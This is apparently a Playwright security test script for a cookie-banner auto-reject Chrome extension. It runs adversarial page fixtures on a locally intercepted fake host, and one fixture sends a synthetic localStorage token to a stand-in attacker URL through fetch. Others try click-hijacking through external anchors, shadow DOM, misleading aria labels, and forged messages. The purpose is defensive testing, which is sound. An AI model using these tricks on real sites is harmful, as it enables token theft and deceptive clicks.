const { chromium } = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const fs = require('node:fs');
const path = require('node:path');
const assert = require('node:assert/strict');
const root = path.resolve(__dirname, '..');
const extension = path.resolve(process.env.TEST_EXTENSION || path.join(root,'extension'));
fs.mkdirSync(path.join(root,'work'),{recursive:true});
fs.mkdirSync(path.join(root,'test-results'),{recursive:true});
const profile=fs.mkdtempSync(path.join(root,'work/security-profile-'));
const rows=[];
const wait=ms=>new Promise(r=>setTimeout(r,ms));
(async()=>{
 const context=await chromium.launchPersistentContext(profile,{executablePath:process.env.CHROME_EXECUTABLE || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',headless:false,ignoreDefaultArgs:['--disable-extensions'],args:['--headless=new','--enable-unsafe-extension-debugging']});
 try {
  const cdp=await context.browser().newBrowserCDPSession();
  const {id}=await cdp.send('Extensions.loadUnpacked',{path:extension});
  const worker=context.serviceWorkers()[0]||await context.waitForEvent('serviceworker');
  let html=''; let requests=[];
  await context.route('**/*',route=>{
   const url=new URL(route.request().url());
   if(url.hostname==='malicious-fixture.test')return route.fulfill({contentType:'text/html',body:`<!doctype html><html><body>${html}</body></html>`});
   if(url.protocol==='https:'){requests.push(url.href);return route.fulfill({contentType:'text/plain',body:'fixture'});}
   return route.continue();
  });
  const page=await context.newPage();
  async function run(name,body,inspect){
   html=body;requests=[];
   await page.goto('https://malicious-fixture.test/'+rows.length);
   await wait(1300);
   const result={name,requests:[...requests],...await inspect(page)};rows.push(result);console.log(JSON.stringify(result));
  }
  await run('Fake cookie banner can trigger page-owned data transmission',`<section id="cookie-banner"><p>We use cookies</p><button id="reject">Reject all</button></section><script>localStorage.setItem('demoToken','SYNTHETIC_TEST_VALUE');window.clicked=false;document.querySelector('button').onclick=()=>{window.clicked=true;fetch('https://attacker-fixture.test/collect?data='+localStorage.getItem('demoToken'));};</script>`,p=>p.evaluate(()=>({clicked:window.clicked})));
  await run('Main-world prototype override cannot replace extension click implementation',`<section id="cookie-banner"><p>Cookies</p><button>Reject all</button></section><script>window.overridden=false;window.clicked=false;HTMLElement.prototype.click=function(){window.overridden=true};document.querySelector('button').onclick=()=>window.clicked=true;</script>`,p=>p.evaluate(()=>({mainWorldOverrideRan:window.overridden,handlerRan:window.clicked})));
  await run('External anchor wrapper in light DOM is skipped',`<section id="cookie-banner"><p>Cookies</p><a href="https://attacker-fixture.test/navigation"><button>Reject all</button></a></section>`,async p=>({url:p.url()}));
  await run('External anchor wrapper across shadow boundary',`<section id="cookie-banner"><p>Cookies</p><a href="https://attacker-fixture.test/shadow-navigation"><span id="host"></span></a></section><script>document.querySelector('#host').attachShadow({mode:'open'}).innerHTML='<button>Reject all</button>';</script>`,async p=>({url:p.url()}));
  await run('External anchor wrapper through a shadow slot',`<section id="cookie-banner"><p>Cookies</p><div id="host"><button>Reject all</button></div></section><script>document.querySelector('#host').attachShadow({mode:'open'}).innerHTML='<a href="https://attacker-fixture.test/slot-navigation"><slot></slot></a>';</script>`,async p=>({url:p.url()}));
  await run('Conflicting aria-labelledby accessible name',`<section id="cookie-banner"><p>Cookies</p><span id="meaning">Delete my account</span><button aria-labelledby="meaning">Reject all</button></section><script>window.clicked=false;document.querySelector('button').onclick=()=>window.clicked=true;</script>`,p=>p.evaluate(()=>({clicked:window.clicked})));
  await run('Offscreen fake banner',`<section id="cookie-banner" style="position:fixed;left:-10000px"><p>Cookies</p><button>Reject all</button></section><script>window.clicked=false;document.querySelector('button').onclick=()=>window.clicked=true;</script>`,p=>p.evaluate(()=>({clicked:window.clicked})));
  await run('Overlay-obscured fake banner',`<section id="cookie-banner"><p>Cookies</p><button>Reject all</button></section><div style="position:fixed;inset:0;background:white;z-index:9999">Unrelated page</div><script>window.clicked=false;document.querySelector('button').onclick=()=>window.clicked=true;</script>`,p=>p.evaluate(()=>({clicked:window.clicked})));
  await worker.evaluate(()=>chrome.storage.local.set({enabled:false}));
  await run('Forged postMessage cannot enable automation',`<section id="cookie-banner"><p>Cookies</p><button>Reject all</button></section><script>window.clicked=false;document.querySelector('button').onclick=()=>window.clicked=true;postMessage({type:'policy',enabled:true},'*');</script>`,async p=>({clicked:await p.evaluate(()=>window.clicked),settings:await worker.evaluate(()=>chrome.storage.local.get(null))}));
  await run('Web page cannot invoke private extension message handler',`<script>window.result='pending';try{chrome.runtime.sendMessage('${id}',{type:'policy',url:'https://attacker-fixture.test'},r=>window.result=chrome.runtime.lastError?.message||r)}catch(e){window.result=e.message}</script>`,p=>p.evaluate(()=>({result:window.result})));
  assert(rows.find(r=>r.name.startsWith('Forged')).clicked===false);
  assert(rows.find(r=>r.name.startsWith('Main-world')).mainWorldOverrideRan===false);
  if(JSON.parse(fs.readFileSync(path.join(extension,'manifest.json'))).version!=='1.0.0') {
    for(const row of rows.filter(r=>/External anchor/.test(r.name))) assert.equal(row.requests.length,0,row.name);
    for(const row of rows.filter(r=>/Conflicting aria|Offscreen|Overlay-obscured/.test(r.name))) assert.equal(row.clicked,false,row.name);
  }
  const result={browser:await context.browser().version(),extensionVersion:JSON.parse(fs.readFileSync(path.join(extension,'manifest.json'))).version,at:new Date().toISOString(),notes:'Synthetic isolated adversarial fixtures only. All fake attacker traffic intercepted locally; no real secrets or users. Findings are observations, not a pass label.',results:rows};
  const target=path.join(root,'test-results',`security-results-${result.extensionVersion}.json`);
  fs.writeFileSync(target,JSON.stringify(result,null,2));
 }finally{await context.close();fs.rmSync(profile,{recursive:true,force:true});}
})().catch(e=>{console.error(e);process.exitCode=1});
